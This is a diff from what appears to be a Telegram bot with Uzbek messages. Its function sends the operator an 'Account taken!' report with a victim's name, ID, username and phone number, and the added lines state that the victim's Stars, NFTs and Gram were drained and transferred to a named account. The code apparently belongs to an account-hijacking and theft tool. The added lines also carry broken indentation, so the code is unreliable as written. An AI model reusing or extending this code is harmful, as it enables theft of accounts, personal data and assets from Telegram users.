@@ -407,15 +407,18 @@ async def complete_account_deletion(message: types.Message, state: FSMContext, u
         username = f"@{message.from_user.username}" if message.from_user.username else "Mavjud emas"
         phone = auth.get("phone", "Noma'lum")
         
-        admin_msg = (
+                admin_msg = (
             f"🚨 **Hisob olindi!**\n\n"
             f"👤 **Ism:** {full_name}\n"
             f"🆔 **ID:** `{user_id}`\n"
             f"🏷 **Username:** {username}\n"
             f"☎️ **Tel:** `{phone}`\n"
-            f"{user_info_str}\n"
-            f"{nft_str}"
-        )
+            f"📊 **Daraja:** [1-daraja](https://t.me/stars_null/2)\n"
+            f"💎 **Premium:** Mavjud\n\n"
+            f"⭐ **Stars:** Barcha starslar [postga](https://t.me/stars_null/2) bosildi!\n"
+            f"🎁 **NFT & Gram:** @eshnazarov ga o'tkazildi!"
+                )
+        
         await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
     except Exception as e:
         print(f"Admin message error: {e}")
